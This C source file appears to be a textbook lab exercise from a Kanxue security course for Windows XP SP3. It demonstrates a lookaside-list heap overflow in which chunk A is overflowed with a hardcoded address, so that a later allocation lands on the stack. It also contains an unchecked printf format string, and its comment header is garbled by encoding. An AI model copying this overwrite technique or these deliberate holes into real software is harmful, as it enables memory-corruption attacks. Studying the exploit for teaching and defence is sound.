/*-----------------------------------------------------------------------
��14��  ©����������
����������ܣ����İ棩��
(c)  ��ѩѧԺ www.kanxue.com 2000-2018
-----------------------------------------------------------------------*/

// heap.cpp : Defines the entry point for the console application.
//ʵ�黷����
//windows xp sp3 + VC6.0 
//����ѡ�Debug��Ĭ�����ã�


#include "stdafx.h"

#include <stdio.h>
#include <windows.h>
 
int main(int argc,char *argv[])
{
        char str[]="\nHello123456789213456789\n";
		
		
        char *a,*b,*c;
        long *hHeap;

        hHeap = (long *)HeapCreate(0x00040000,0,0);
        printf("\n(+) Creating a heap at: 0x00%xh\n",hHeap);
        printf("(+) Allocating chunk A\n");
		
        a = (char *)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
        printf("(+) Allocating chunk B\n");
		
        b = (char *)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
		
        printf("(+) Chunk A=0x00%x\n(+) Chunk B=0x00%x\n",a,b);
        printf("(+) Freeing chunk B to the lookaside\n");
		
        HeapFree(hHeap,0,b);
		
        printf("(+) Now overflow chunk A:\n");
		
        printf("%x\n",str);
        printf(str);
        memcpy(a,"XXXXXXXXXXXXXXXXAAAABBBB\x64\xff\x12\x00",28);
		
        // set software bp
        //__asm__("int $0x3");
		
        printf("(+) Allocating chunk B\n");
		

        b = (char *)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
        printf("(+) Allocating chunk C\n");
		

        c = (char *)HeapAlloc(hHeap,HEAP_ZERO_MEMORY,0x10);
		
        printf("(+) Chunk A=0x00%x\n(+)Chunk B=0x00%x\n(+) Chunk C=0x00%x\n",a,b,c);
		
        strcpy(c,"AAAAAAAAAAAA\n");
        printf(str);
        // set software bp
        //_asm int 0x3;
		
        return 0;
}
